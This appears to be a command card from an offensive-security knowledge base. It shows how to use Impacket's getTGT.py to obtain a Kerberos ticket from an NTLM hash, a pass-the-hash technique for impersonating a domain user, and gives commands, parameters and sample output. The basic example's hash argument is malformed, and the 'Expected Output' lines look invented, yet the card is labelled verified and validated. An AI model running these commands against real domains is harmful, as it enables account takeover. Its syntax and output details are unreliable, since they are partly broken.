---
type: command
executor: bash
data: 'python getTGT.py -hashes ":$_NT_HASH" $_DOMAIN/$_USERNAME'
tags:
  - kerberos
  - authentication
platforms:
  - Linux
verified: true
validated: true
---

# get-tgt-using-nt-hash

## Command

```bash
python getTGT.py -hashes ":$_NT_HASH" $_DOMAIN/$_USERNAME
```

## Description

This command uses Impacket's getTGT.py to request a Kerberos Ticket Granting Ticket (TGT) from the domain KDC using an NTLM hash, enabling pass-the-hash authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_NT_HASH | NTLM hash of the user account in hex format (LM hash omitted with leading colon) | Yes |
| $_DOMAIN | Fully qualified domain name (e.g., lab.ropnop.com) | Yes |
| $_USERNAME | Domain username to impersonate | Yes |
| -hashes | Flag to specify LM:NT hash pair | Built-in |

## Examples

### Basic Usage

```bash
python getTGT.py -hashes ":aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0" lab.ropnop.com/velociraptor
```

### Advanced Usage

```bash
python getTGT.py -hashes ":$NT_HASH" $DOMAIN/$USERNAME -dc-ip $_DC_IP
```

## Expected Output

Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

Type username@domain for Kerberos ticket: 
MinKerberosVersion 6 found, ticket will be encrypted with RC4
Saving ticket in velociraptor.ccache

This indicates successful TGT generation and storage in a ccache file.

## Related

- [[procedures/OverPass-the-Hash-with-Impacket]]
- [[commands/authenticate-with-psexec-using-tgt]]
